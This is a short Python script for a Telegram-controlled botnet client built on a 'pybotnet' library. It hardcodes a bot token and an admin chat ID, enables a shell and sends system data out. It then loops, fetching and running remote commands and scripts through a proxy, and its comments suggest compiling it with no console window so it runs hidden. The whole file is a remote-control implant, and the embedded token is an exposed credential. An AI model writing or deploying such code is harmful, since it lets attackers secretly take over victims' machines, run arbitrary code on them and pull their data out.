from pybotnet import pybotnet,util

# change your token and chat id ===> get from @BotFather on telegram

TELEGRAM_TOKEN = '1970303122:AAG7c99ycierpNXLcVEixUneuJc-Epeba3s'

ADMIN_CHAT_ID = '1947234025'

# * if you compile code without shell (--noconsole in pyinstaller): is_sheel=False
# * show_log: just for debugging
# * send_system_data: send system short info in bot messages

bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,show_log=True,
                         send_system_data=True, is_shell=True)



while 1:
    util.get_runtime_command(ADMIN_CHAT_ID,TELEGRAM_TOKEN)
    print('*-*'*15)
    bot.get_and_execute_scripts_by_third_party_proxy()
